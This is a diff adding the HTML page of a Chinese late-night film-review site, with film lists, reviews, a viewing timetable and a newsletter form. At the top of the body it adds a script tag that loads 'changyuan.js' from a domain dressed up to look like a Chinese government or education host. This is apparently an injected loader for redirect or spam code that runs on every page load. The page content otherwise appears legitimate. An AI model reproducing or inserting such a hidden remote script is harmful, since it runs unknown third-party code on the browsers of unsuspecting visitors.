@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>被窝影视｜深夜放映室 · 夜猫片单 · 枕头边影评与独立短片档案</title>
+<meta name="keywords" content="被窝影视, 深夜放映室, 夜猫片单, 枕头边影评, 独立短片档案, 凌晨观影, 小众电影推荐, 床边影像日记, beiwoyingshi-top.github.io">
+<meta name="description" content="被窝影视（beiwoyingshi-top.github.io）是一座开在凌晨的放映室：整理夜猫子专属片单、枕头边影评与独立短片档案，陪失眠的人、赶稿的人和上夜班的人看完一部电影。">
+<link rel="canonical" href="https://beiwoyingshi-top.github.io">
+<meta name="theme-color" content="#14131c">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#14131c; --ink2:#1e1c2b; --plum:#3a2a4a; --velvet:#6b3d5c;
+  --glow:#e8a0bf; --glow2:#a8c0e8; --paper:#f5f1ea; --mute:#8c8aa3; --line:#2e2b3d;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",system-ui,-apple-system,sans-serif;
+  background:var(--ink); color:var(--paper); line-height:1.85; overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:""; position:fixed; inset:0; z-index:0; pointer-events:none;
+  background:
+    radial-gradient(1.2px 1.2px at 12% 18%, rgba(232,160,191,.55) 50%, transparent 51%),
+    radial-gradient(1px 1px at 28% 62%, rgba(255,255,255,.5) 50%, transparent 51%),
+    radial-gradient(1.4px 1.4px at 55% 33%, rgba(168,192,232,.5) 50%, transparent 51%),
+    radial-gradient(1px 1px at 78% 74%, rgba(255,255,255,.45) 50%, transparent 51%),
+    radial-gradient(1.1px 1.1px at 90% 12%, rgba(232,160,191,.5) 50%, transparent 51%),
+    radial-gradient(1px 1px at 42% 88%, rgba(255,255,255,.4) 50%, transparent 51%),
+    radial-gradient(1.3px 1.3px at 66% 52%, rgba(168,192,232,.45) 50%, transparent 51%),
+    radial-gradient(900px 600px at 80% -10%, rgba(107,61,92,.35), transparent 60%),
+    radial-gradient(800px 700px at -10% 110%, rgba(58,42,74,.5), transparent 60%);
+  background-color:var(--ink);
+}
+.wrap{position:relative;z-index:1;max-width:1180px;margin:0 auto;padding:0 28px}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* ===== 顶栏 ===== */
+header{
+  position:sticky;top:0;z-index:50;background:rgba(20,19,28,.88);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.hd{display:flex;align-items:center;justify-content:space-between;height:66px}
+.logo{display:flex;align-items:baseline;gap:9px;font-weight:800;letter-spacing:.02em}
+.logo b{font-size:22px;color:var(--glow)}
+.logo span{font-size:11px;color:var(--mute);letter-spacing:.2em;text-transform:uppercase;border-left:1px solid var(--line);padding-left:9px}
+nav ul{display:flex;gap:2px;list-style:none}
+nav a{
+  display:block;padding:8px 14px;font-size:14px;color:#c9c6d8;border-radius:2px;
+  border-bottom:2px solid transparent;transition:.2s;
+}
+nav a:hover{color:var(--glow);border-bottom-color:var(--glow)}
+.ham{display:none;width:34px;height:26px;flex-direction:column;justify-content:space-between;cursor:pointer;background:none;border:0;padding:0}
+.ham i{display:block;height:2px;background:var(--paper);border-radius:2px;transition:.25s}
+.ham.on i:nth-child(1){transform:translateY(12px) rotate(45deg)}
+.ham.on i:nth-child(2){opacity:0}
+.ham.on i:nth-child(3){transform:translateY(-12px)rotate(-45deg)}
+
+/* ===== 通用栏头 ===== */
+.eyebrow{display:flex;align-items:center;gap:14px;margin-bottom:34px;flex-wrap:wrap}
+.eyebrow .no{
+  font-family:Georgia,serif;font-size:13px;color:var(--glow);letter-spacing:.1em;
+  border:1px solid rgba(232,160,191,.4);padding:3px 10px;
+}
+.eyebrow h2{font-size:clamp(22px,3vw,30px);font-weight:800;letter-spacing:.01em}
+.eyebrow em{font-style:normal;font-size:12px;color:var(--mute);letter-spacing:.18em;text-transform:uppercase}
+.eyebrow .more{margin-left:auto;font-size:13px;color:var(--mute);border-bottom:1px dashed var(--line);padding-bottom:2px;transition:.2s}
+.eyebrow .more:hover{color:var(--glow);border-bottom-color:var(--glow)}
+
+/* ===== 首屏 ===== */
+.hero{padding:88px 0 78px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:9px;font-size:12px;letter-spacing:.22em;color:var(--glow2);margin-bottom:24px}
+.kicker::before{content:"";width:34px;height:1px;background:var(--glow2)}
+.hero h1{
+  font-size:clamp(42px,7vw,80px);line-height:.98;font-weight:900;letter-spacing:-.02em;
+}
+.hero h1 small{display:block;font-size:clamp(15px,1.6vw,18px);font-weight:400;color:var(--mute);letter-spacing:.05em;margin-top:18px;line-height:1.7}
+.hero p.lede{margin-top:26px;font-size:16px;color:#c4c1d2;max-width:46ch}
+.clock{margin-top:38px;display:flex;align-items:center;gap:26px;flex-wrap:wrap}
+.clock b{font-family:Georgia,serif;font-size:42px;color:var(--glow);font-weight:400;letter-spacing:.04em}
+.clock span{font-size:13px;color:var(--mute);max-width:26ch;line-height:1.7}
+.hero-cta{margin-top:40px;display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:9px;padding:13px 26px;border:1px solid var(--glow);
+  color:var(--glow);font-size:14px;transition:.25s;background:transparent;cursor:pointer;
+}
+.btn:hover{background:var(--glow);color:var(--ink)}
+.btn.ghost{border-color:var(--line);color:#c4c1d2}
+.btn.ghost:hover{border-color:#c4c1d2;background:#c4c1d2;color:var(--ink)}
+
+/* 放映窗口 */
+.screen{
+  position:relative;background:linear-gradient(160deg,#1e1c2b,#14131c);
+  border:1px solid var(--line);padding:30px 28px;box-shadow:0 30px 70px -20px rgba(0,0,0,.8);
+}
+.screen::after{
+  content:"";position:absolute;inset:8px;border:1px solid rgba(232,160,191,.12);pointer-events:none;
+}
+.screen .tag{font-size:11px;letter-spacing:.24em;color:var(--mute);text-transform:uppercase}
+.screen .now{font-size:clamp(22px,2.6vw,28px);font-weight:800;margin:14px 0 4px;line-height:1.35}
+.screen .en{font-family:Georgia,serif;font-style:italic;font-size:15px;color:var(--glow);letter-spacing:.04em}
+.screen ul{list-style:none;margin-top:24px;border-top:1px solid var(--line)}
+.screen li{display:flex;gap:14px;padding:13px 0;border-bottom:1px solid var(--line);font-size:14px;color:#c4c1d2}
+.screen li b{font-family:Georgia,serif;color:var(--glow);font-weight:400;min-width:46px;font-size:13px}
+
+/* ===== 通用分节 ===== */
+section{padding:74px 0;border-top:1px solid var(--line)}
+.quote{
+  background:linear-gradient(100deg,var(--plum),var(--ink2));
+  padding:52px 0;margin-top:0;border-top:1px solid var(--line);
+}
+.quote blockquote{
+  font-size:clamp(18px,2.4vw,24px);line-height:1.9;max-width:34ch;font-weight:600;letter-spacing:.01em;
+}
+.quote cite{display:block;margin-top:20px;font-size:13px;color:var(--glow);font-style:normal;letter-spacing:.08em}
+
+/* ===== 夜猫片单 ===== */
+.films{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.film{position:relative;border:1px solid var(--line);background:var(--ink2);overflow:hidden;transition:.35s}
+.film .poster{
+  position:relative;aspect-ratio:3/4;overflow:hidden;display:flex;align-items:flex-end;padding:18px;
+}
+.film .poster::before{
+  content:"";position:absolute;inset:0;opacity:.9;
+  background:var(--bg),radial-gradient(circle at 80% 20%,rgba(255,255,255,.16),transparent 45%);
+}
+.film:nth-child(1) .poster{--bg:linear-gradient(160deg,#3a2a4a,#14131c)}
+.film:nth-child(2) .poster{--bg:linear-gradient(160deg,#2a3a4a,#14131c)}
+.film:nth-child(3) .poster{--bg:linear-gradient(160deg,#4a2a3a,#14131c)}
+.film:nth-child(4) .poster{--bg:linear-gradient(160deg,#2a4a40,#14131c)}
+.film:nth-child(5) .poster{--bg:linear-gradient(160deg,#4a3a2a,#14131c)}
+.film:nth-child(6) .poster{--bg:linear-gradient(160deg,#3a4a2a,#14131c)}
+.film .poster span{position:relative;font-family:Georgia,serif;font-size:30px;font-weight:800;line-height:1.1}
+.film .poster i{position:absolute;right:16px;top:16px;font-style:normal;font-size:11px;letter-spacing:.16em;color:var(--glow);border:1px solid rgba(232,160,191,.4);padding:2px 8px}
+.film .body{padding:20px 22px 24px}
+.film .body h3{font-size:18px;margin-bottom:8px}
+.film .body p{font-size:13.5px;color:var(--mute);line-height:1.8}
+.film .meta{display:flex;gap:10px;margin-top:16px;font-size:11.5px;color:#9c9ab0;letter-spacing:.06em;flex-wrap:wrap}
+.film .meta b{color:var(--glow);font-weight:400}
+.film:hover{transform:translateY(-6px);border-color:var(--glow)}
+
+/* ===== 影评 ===== */
+.reviews{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.review{border-left:3px solid var(--velvet);padding:6px 0 6px 24px;transition:.25s}
+.review:hover{border-left-color:var(--glow)}
+.review h3{font-size:19px;margin-bottom:10px;line-height:1.5}
+.review p{font-size:14px;color:var(--mute);line-height:1.85}
+.review .who{display:block;margin-top:14px;font-size:12px;color:var(--glow2);letter-spacing:.05em}
+
+/* ===== 时刻表 ===== */
+.timetable{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line)}
+.tt{background:var(--ink2);padding:26px 22px;min-height:200px;transition:.3s}
+.tt:hover{background:var(--plum)}
+.tt b{display:block;font-family:Georgia,serif;font-size:32px;color:var(--glow);font-weight:400}
+.tt span{display:block;font-size:12px;letter-spacing:.16em;color:var(--mute);text-transform:uppercase;margin:6px 0 14px}
+.tt p{font-size:13.5px;color:#b9b6c8;line-height:1.8}
+.tt strong{display:inline-block;margin-top:14px;font-size:11px;color:var(--glow2);font-weight:400;letter-spacing:.06em}
+
+/* ===== 表格 ===== */
+table{width:100%;border-collapse:collapse;font-size:14px;background:var(--ink2);border:1px solid var(--line)}
+th,td{padding:15px 18px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--glow);font-weight:600;background:rgba(107,61,92,.25)}
+td{color:#c4c1d2}
+td:first-child{color:#fff;font-weight:600;white-space:nowrap}
+.pill{display:inline-block;font-size:11.5px;padding:2px 10px;border:1px solid var(--velvet);color:var(--glow)}
+.pill.blue{border-color:#3d5c8f;color:var(--glow2)}
+.pill.gold{border-color:#8f7a3d;color:#e8d5a0}
+
+/* ===== 通讯 ===== */
+.subscribe{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line)}
+.sub-l{padding:44px 40px;background:linear-gradient(150deg,var(--velvet),var(--plum))}
+.sub-l .big{font-family:Georgia,serif;font-size:40px;line-height:1.2;font-weight:800}
+.sub-l p{margin-top:16px;font-size:14px;color:rgba(255,255,255,.82);line-height:1.85;max-width:34ch}
+.sub-r{padding:44px 40px;background:var(--ink2);display:flex;flex-direction:column;justify-content:center}
+.sub-r label{font-size:12px;letter-spacing:.16em;color:var(--mute);text-transform:uppercase;margin-bottom:10px}
+.sub-r input{
+  width:100%;background:transparent;border:0;border-bottom:1px solid var(--line);
+  padding:12px 0;color:var(--paper);font-size:16px;outline:none;
+}
+.sub-r input:focus{border-bottom-color:var(--glow)}
+.sub-r button{margin-top:26px;width:100%;padding:14px;background:var(--glow);color:var(--ink);border:0;font-size:14px;font-weight:700;letter-spacing:.06em;cursor:pointer;transition:.2s}
+.sub-r button:hover{background:#fff}
+.sub-r small{margin-top:14px;font-size:12px;color:var(--mute);line-height:1.7}
+
+/* ===== 底部 ===== */
+footer{border-top:1px solid var(--line);padding:56px 0 40px}
+.ft{display:grid;grid-template-columns:1.3fr 1fr 1fr 1fr;gap:40px}
+.ft h4{font-size:12px;letter-spacing:.2em;color:var(--glow);text-transform:uppercase;margin-bottom:18px}
+.ft ul{list-style:none}
+.ft li{margin-bottom:10px;font-size:14px;color:#9c9ab0}
+.ft a:hover{color:var(--glow)}
+.ft-big{font-size:15px;color:#c4c1d2;line-height:1.9;max-width:34ch}
+.ft-big b{color:var(--glow)}
+.copyright{margin-top:44px;padding-top:24px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:12.5px;color:var(--mute)}
+#toast{
+  position:fixed;left:50%;bottom:34px;transform:translateX(-50%) translateY(20px);z-index:99;
+  background:var(--glow);color:var(--ink);padding:13px 28px;font-size:14px;font-weight:600;
+  opacity:0;pointer-events:none;transition:.3s;
+}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .hero-grid{grid-template-columns:1fr;gap:46px}
+  .screen{order:-1}
+  .films{grid-template-columns:repeat(2,1fr)}
+  .reviews,.subscribe,.ft{grid-template-columns:1fr}
+  .timetable{grid-template-columns:1fr 1fr}
+  .sub-l,.sub-r{padding:34px 26px}
+}
+@media(max-width:680px){
+  .wrap{padding:0 18px}
+  nav{position:fixed;left:0;right:0;top:66px;background:rgba(20,19,28,.98);border-bottom:1px solid var(--line);max-height:0;overflow:hidden;transition:.3s}
+  nav.open{max-height:420px}
+  nav ul{flex-direction:column;padding:14px 18px;gap:0}
+  nav a{padding:14px 0;border-bottom:1px solid var(--line);border-radius:0}
+  .ham{display:flex}
+  .hero{padding:54px 0 46px}
+  .films{grid-template-columns:1fr}
+  .timetable{grid-template-columns:1fr}
+  .clock{flex-direction:column;align-items:flex-start;gap:10px}
+  section{padding:52px 0}
+  .table-wrap{overflow-x:auto}
+  table{min-width:620px}
+  .copyright{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo">
+      <b>被窝影视</b>
+      <span>Late Night Cinema</span>
+    </div>
+    <nav id="nav">
+      <ul>
+        <li><a href="#films">夜猫片单</a></li>
+        <li><a href="#reviews">枕头边影评</a></li>
+        <li><a href="#hours">凌晨时刻表</a></li>
+        <li><a href="#list">本周排片</a></li>
+        <li><a href="#about">关于被窝</a></li>
+        <li><a href="#letter">来一封信</a></li>
+      </ul>
+    </nav>
+    <button class="ham" id="ham" aria-label="菜单"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<main>
+
+  <!-- 首屏 -->
+  <div class="wrap hero">
+    <div class="hero-grid">
+      <div>
+        <div class="kicker">OPEN AFTER MIDNIGHT · 凌晨两点准时开灯</div>
+        <h1>被窝影视
+          <small>一座只在上半夜之后营业的放映室。为失眠的人、赶稿的人、刚下夜班的人和所有舍不得关灯的人，留一部电影。</small>
+        </h1>
+        <p class="lede">我们不追热点，也不抢首映。我们只在深夜重放那些白天被忽略的镜头：一段 47 秒的长镜头，一句被片尾字幕盖住的对白，还有你和屏幕之间那杯凉掉的茶。</p>
+        <div class="clock">
+          <b id="clk">02:00</b>
+          <span>现在是放映时间。<br>今晚的主片已选好，请调低亮度，把手机翻过去。</span>
+        </div>
+        <div class="hero-cta">
+          <a class="btn" href="#films">查看今晚片单 →</a>
+          <a class="btn ghost" href="#letter">寄一封观后感</a>
+        </div>
+      </div>
+
+      <aside class="screen">
+        <div class="tag">Now Showing / Tonight</div>
+        <div class="now">《夜以继日》<br>重看笔记</div>
+        <div class="en">Asako I &amp; II</div>
+        <ul>
+          <li><b>00:30</b><span>开场提示：准备纸巾，不必开灯</span></li>
+          <li><b>01:15</b><span>中场：去倒一杯水，别看手机</span></li>
+          <li><b>02:40</b><span>结尾字幕请看完，片尾有彩蛋</span></li>
+          <li><b>03:00</b><span>关屏，允许自己五分钟不说话</span></li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+
+  <!-- 引语 -->
+  <div class="quote">
+    <div class="wrap">
+      <blockquote>「白天的电影属于所有人，凌晨的电影只属于还醒着的那一个。我们看电影不是为了逃避夜晚，而是为了学会和夜晚相处。」</blockquote>
+      <cite>— 被窝影视 · 放映员手记</cite>
+    </div>
+  </div>
+
+  <!-- 夜猫片单 -->
+  <section id="films">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="no">No.01</span>
+        <h2>夜猫片单</h2>
+        <em>Six Films for Sleepless Nights</em>
+        <a class="more" href="#">查看全部 120 部 →</a>
+      </div>
+
+      <div class="films">
+        <article class="film">
+          <div class="poster"><span>花束<br>般的<br>恋爱</span><i>NIGHT</i></div>
+          <div class="body">
+            <h3>《花束般的恋爱》重看指南</h3>
+            <p>第三次看才注意到，他们在居酒屋那场戏里，碗筷换了三次位置。爱情的细节从来不在台词里，在道具组手里。</p>
+            <div class="meta"><b>127 min</b><span>· 爱情 / 都市</span><span>· 适合：分手第三周</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster"><span>驾驶<br>我的<br>车</span><i>SLOW</i></div>
+          <div class="body">
+            <h3>《驾驶我的车》：用三个小时学会沉默</h3>
+            <p>它不是长，是慢。慢到你可以中途去热一杯牛奶，回来还能接上上一句台词，而且毫无违和感。</p>
+            <div class="meta"><b>179 min</b><span>· 剧情 / 舞台</span><span>· 适合：凌晨独自一人</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster"><span>偶然<br>与<br>想象</span><i>3 CHAPTERS</i></div>
+          <div class="body">
+            <h3>《偶然与想象》：三个故事，三个来不及</h3>
+            <p>滨口龙介用最省的成本拍出了最贵的东西：人在话没说完时脸上那三秒的表情。</p>
+            <div class="meta"><b>121 min</b><span>· 三段式 / 独立</span><span>· 适合：写不出东西的夜</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster"><span>彗星<br>来时</span><i>LOOP</i></div>
+          <div class="body">
+            <h3>《你的名字。》彗星篇之外的夜</h3>
+            <p>我们重剪了 17 段星空镜头，做成 42 分钟的纯视听版。失眠最重的那几天，我靠它撑过去的。</p>
+            <div class="meta"><b>42 min</b><span>· 视听剪辑 / 非官方</span><span>· 适合：耳鸣的夜</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster"><span>路边<br>野餐</span><i>42 MIN</i></div>
+          <div class="body">
+            <h3>《路边野餐》那 42 分钟长镜头</h3>
+            <p>整部电影其实是为了这一个镜头。看懂看不懂都不重要，贵州的雾气会替你流泪。</p>
+            <div class="meta"><b>110 min</b><span>· 诗电影 / 贵州</span><span>· 适合：想念远方的夜</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster"><span>完美的<br>日子</span><i>DAILY</i></div>
+          <div class="body">
+            <h3>《完美的日子》：一个清洁工的清晨</h3>
+            <p>看完会想去打扫房间，把被子晒到下午三点。它治不好失眠，但能治好"今天什么都没做"的愧疚。</p>
+            <div class="meta"><b>124 min</b><span>· 日常 / 治愈</span><span>· 适合：需要睡前的秩序</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 影评 -->
+  <section id="reviews">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="no">No.02</span>
+        <h2>枕头边影评</h2>
+        <em>Pillow Talk · Long Form</em>
+        <a class="more" href="#">更多长评 →</a>
+      </div>
+
+      <div class="reviews">
+        <article class="review">
+          <h3>我们为什么总在凌晨重看同一部电影？</h3>
+          <p>白天的重看是复习，凌晨的重看是问诊。你把灯关掉，把声音开小，屏幕的光打在天花板上，那部电影就不再是导演的作品，变成了你自己的病历。我们整理了 31 位读者的"凌晨重看清单"，最常见的三部是《花束般的恋爱》《驾驶我的车》《完美的日子》——它们的共同点不是悲伤，而是节奏慢到允许你走神，又温柔到不会在你走神时惩罚你。</p>
+          <span class="who">— 放映员 · 3 月 14 日</span>
+        </article>
+
+        <article class="review">
+          <h3>关于"看不完"这件事，我们想说几句</h3>
+          <p>被窝影视的片单里，有一半是故意没看完的。我们不再把"看完"当作一次观看的完成标准：看完 20 分钟就睡着，那 20 分钟是有效的；中途退出去看窗外的雨，那也是有效的。电影不是任务，凌晨更不是。本期我们选了 12 部"适合看 30 分钟就关掉"的短片，全部在 30 分钟以内，全部允许被打断。</p>
+          <span class="who">— 编辑部 · 3 月 09 日</span>
+        </article>
+
+        <article class="review">
+          <h3>字幕之外：我们开始记录那些被翻译丢掉的东西</h3>
+          <p>一句日语的"嗯"被翻成中文的"好"，中间丢掉的不是一个字，是说话人低头时那一秒的犹豫。从本期起我们开设"字幕边角"专栏，逐句比对 8 部影片的中日、中英字幕差异，把被压缩掉的情绪重新摊开。欢迎日语、英语、法语、德语读者投稿你发现的那一句。</p>
+          <span class="who">— 字幕组退休人士 · 3 月 02 日</span>
+        </article>
+
+        <article class="review">
+          <h3>片尾字幕请看完：一个被忽视的 4 分钟</h3>
+          <p>我们统计了 200 部影片的片尾字幕时长，平均 3 分 47 秒。这段时间你在干什么？划手机、开灯、关投影、讨论晚饭。而这 4 分钟里，配乐往往最完整，画面往往最留白，它是整部电影唯一允许你安静喘气的段落。本期推荐 15 部"片尾字幕值得看"的影片，附上每部的字幕配乐清单。</p>
+          <span class="who">— 片尾观察员 · 2 月 26 日</span>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 时刻表 -->
+  <section id="hours">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="no">No.03</span>
+        <h2>凌晨时刻表</h2>
+        <em>What Time Is It In Your Movie</em>
+        <a class="more" href="#">完整时间表 →</a>
+      </div>
+
+      <div class="timetable">
+        <div class="tt">
+          <b>23:00</b><span>前夜</span>
+          <p>适合看一点轻松的。不要在这时候打开沉重的片子，你会睡不着的。</p>
+          <strong>推荐：短片 / 动画</strong>
+        </div>
+        <div class="tt">
+          <b>00:30</b><span>入夜</span>
+          <p>家里安静下来，这是看对话戏最好的时候。你听得到每一处停顿。</p>
+          <strong>推荐：对白型剧情</strong>
+        </div>
+        <div class="tt">
+          <b>02:00</b><span>深夜</span>
+          <p>情绪最脆的时段。只适合重看，不适合第一次看任何东西。</p>
+          <strong>推荐：已看过三遍以上</strong>
+        </div>
+        <div class="tt">
+          <b>04:00</b><span>破晓</span>
+          <p>天快亮了，这时候应该关掉屏幕。但如果你还在看，我们准备了 12 分钟的纯自然声。</p>
+          <strong>推荐：收工 / 白噪音</strong>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 排片表 -->
+  <section id="list">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="no">No.04</span>
+        <h2>本周排片</h2>
+        <em>This Week at the Den</em>
+        <a class="more" href="#">订阅每周更新 →</a>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>日期</th><th>主片</th><th>放映时段</th><th>类型</th><th>状态</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>周一 3/17</td><td>《花束般的恋爱》第三次重看</td><td>00:30 – 02:37</td><td>爱情 / 都市</td><td><span class="pill">已放映</span></td></tr>
+            <tr><td>周二 3/18</td><td>短片合集：《失眠者的八分钟》</td><td>23:15 – 00:00</td><td>独立短片</td><td><span class="pill">已放映</span></td></tr>
+            <tr><td>周三 3/19</td><td>《驾驶我的车》导演剪辑版</td><td>01:00 – 04:00</td><td>剧情 / 舞台</td><td><span class="pill">已放映</span></td></tr>
+            <tr><td>周五 3/21</td><td>《偶然与想象》三章连映</td><td>23:30 – 01:31</td><td>三段式</td><td><span class="pill gold">今晚主片</span></td></tr>
+            <tr><td>周六 3/22</td><td>观众点映：《路边野餐》</td><td>00:00 – 01:50</td><td>诗电影</td><td><span class="pill blue">点映报名中</span></td></tr>
+            <tr><td>周日 3/23</td><td>《完美的日子》清晨收看版</td><td>23:00 – 01:04</td><td>日常 / 治愈</td><td><span class="pill blue">预告</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- 通讯订阅 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="eyebrow">
+        <span class="no">No.05</span>
+        <h2>关于被窝影视</h2>
+        <em>What This Place Is</em>
+      </div>
+
+      <div class="subscribe">
+        <div class="sub-l">
+          <div class="big">我们不做资源站，<br>我们做放映表。</div>
+          <p>被窝影视（<b>beiwoyingshi-top.github.io</b>）是一份关于深夜观看的私人档案：夜猫片单、枕头边长评、字幕边角、凌晨时刻表，以及一份每周更新的排片表。我们不开播放器，不放下载链接，不聚合任何影视资源；片单里每部影片都附上你在公开渠道能找到它的方式。我们相信，凌晨两点看完一部电影之后，你需要的不是一个链接，是一段能接住你的文字。</p>
+        </div>
+        <div class="sub-r">
+          <label for="email">每七天，一封信</label>
+          <input id="email" type="email" placeholder="你的邮箱地址">
+          <button type="button" id="subBtn">订阅本周排片表</button>
+          <small>每周五傍晚发送，内容是下周七天的放映安排与一篇枕头边长评。随时可退订，我们不会把你的地址给任何人。</small>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer id="letter">
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <div class="logo" style="margin-bottom:18px">
+          <b>被窝影视</b>
+          <span>Late Night Cinema</span>
+        </div>
+        <p class="ft-big">一座只在上半夜之后营业的放映室。我们记录那些白天被忽略的镜头，以及凌晨看完电影之后，你和屏幕之间那杯凉掉的茶。</p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#films">夜猫片单</a></li>
+          <li><a href="#reviews">枕头边影评</a></li>
+          <li><a href="#hours">凌晨时刻表</a></li>
+          <li><a href="#list">本周排片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>资料</h4>
+        <ul>
+          <li><a href="#">字幕边角专栏</a></li>
+          <li><a href="#">片尾字幕记录</a></li>
+          <li><a href="#">短片合集目录</a></li>
+          <li><a href="#">凌晨观影年鉴</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>联络</h4>
+        <ul>
+          <li><a href="#">投稿一个凌晨的片单</a></li>
+          <li><a href="#">字幕纠错与补充</a></li>
+          <li><a href="#">RSS 订阅</a></li>
+          <li><a href="#">关于本站</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="copyright">
+      <span>© <span id="yr">2026</span> 被窝影视 · 深夜放映室 · 本站网址 <b>https://beiwoyingshi-top.github.io</b></span>
+      <span>本站为影视观看记录与影评资料站，不提供任何影视资源下载与在线播放服务。</span>
+    </div>
+  </div>
+</footer>
+
+<div id="toast">已收到，谢谢你的来信。放映员会在三天内回信。</div>
+
+<script>
+(function(){
+  var ham=document.getElementById('ham'),nav=document.getElementById('nav');
+  ham.addEventListener('click',function(){ham.classList.toggle('on');nav.classList.toggle('open');});
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){ham.classList.remove('on');nav.classList.remove('open');});});
+
+  var clk=document.getElementById('clk');
+  function tick(){
+    var d=new Date(),h=d.getHours(),m=d.getMinutes();
+    clk.textContent=(h<10?'0'+h:h)+':'+(m<10?'0'+m:m);
+  }
+  tick();setInterval(tick,10000);
+
+  document.getElementById('subBtn').addEventListener('click',function(){
+    var v=document.getElementById('email').value;
+    var t=document.getElementById('toast');
+    t.textContent = v && v.indexOf('@')>-1 ? '订阅成功，下一封信周五傍晚发出。' : '请填写一个有效的邮箱地址。';
+    t.classList.add('show');
+    setTimeout(function(){t.classList.remove('show');},2600);
+  });
+
+  document.getElementById('yr').textContent=new Date().getFullYear();
+})();
+</script>
+</body>
+</html>
